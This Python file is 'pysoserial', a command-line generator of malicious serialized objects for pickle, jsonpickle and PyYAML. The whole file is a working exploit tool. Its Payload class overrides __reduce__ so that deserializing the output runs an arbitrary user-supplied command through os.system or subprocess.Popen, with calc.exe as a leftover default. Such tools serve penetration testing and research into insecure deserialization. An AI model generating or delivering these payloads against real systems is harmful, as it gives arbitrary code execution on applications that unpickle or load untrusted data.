import os
import _pickle
import subprocess
import types

import jsonpickle
import sys
import yaml
import argparse


class Payload:
    def __reduce__(self):
        return (os.system, ("cmd /c calc.exe",))


    def __init__(self, command=None, vector=None):
        self.vector = vector
        self.command = command

    def __reduce__(self):
        if self.vector == "os":
            return (os.system, (self.command,))
        elif self.vector == "subprocess":
            return (subprocess.Popen, (self.command,))



def _patch(bytestream):
    byte_array = bytearray(bytestream)
    byte_array[-4] = int("52", 16)
    return bytes(byte_array)


def generate_class(name=None, methods=None):
    if not name:
        return None
    elif not methods:
        return None
    else:
        return type(name, (object,), methods)()


def serialize_class(commands, vector=None, debug=False):
    if not commands:
        print(f"[-] No command provided")
    else:
        if vector == "os":
            methods = {"__reduce__": lambda self: (os.system, (commands,))}
        elif vector == "subprocess":
            methods = {"__reduce__": lambda self: (subprocess.Popen, (commands,))}
        else:
            methods = {"__reduce__": lambda self: (os.system, (commands,))}
        cls = generate_class("Payload", methods)
        if debug:
            print(cls.__getattribute__("__reduce__"))
            print(Payload.__getattribute__(Payload(), "__reduce__"))
        return cls.__reduce__()


def print_available_formats():
    available_formats = {
        "pickle": "Format for cPickle and _pickle modules",
        "json": "Format for jsonpickle module",
        "yaml": "Format for PyYAML module"
        }
    for k, v in available_formats.items():
        print(f"    {k}: {v}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='pysoserial - A simple serialization payload generator', add_help=True)

    parser.add_argument(
        '-d', '--debug', required=False, action='store_true', default=False,
        help='Enable debug messages')
    parser.add_argument(
        '-s', '--save', required=False, action='store_true', default=False,
        help='Save payload to file')
    parser.add_argument(
        '-v', '--vector', required=False, choices=["os", "subprocess"], default="os",
        help='Save payload to file')
    parser.add_argument(
        '-f', '--format', required=True, choices=["pickle", "json", "yaml", "#"], default="#",
        help='Serialization archive format')
    parser.add_argument(
        '-c', '--command', type=str, required=False, default=None, help='Command for the payload')

    args = parser.parse_args()

    if args.format == "#":
        print(f"[*] The following format are accepted:")
        print_available_formats()
        sys.exit()
    if not args.command:
        print(f"[-] A command (-c) is required to generate the payload")
    command = args.command

    print(f"[+] Generating serialized object for:")
    print(f"    {command}")
    cls = Payload(command, args.vector)

    if args.format == "pickle":

        with open("payload.bin", "wb") as payload:
            payload.write(_patch(_pickle.dumps(serialize_class(command))))
    elif args.format == "json":
        with open("payload.json", "w") as payload:
            payload.write(jsonpickle.encode(cls))
    elif args.format == "yaml":
        with open("payload.yml", "w") as payload:
            yaml.dump(cls, payload)
    else:
        sys.exit()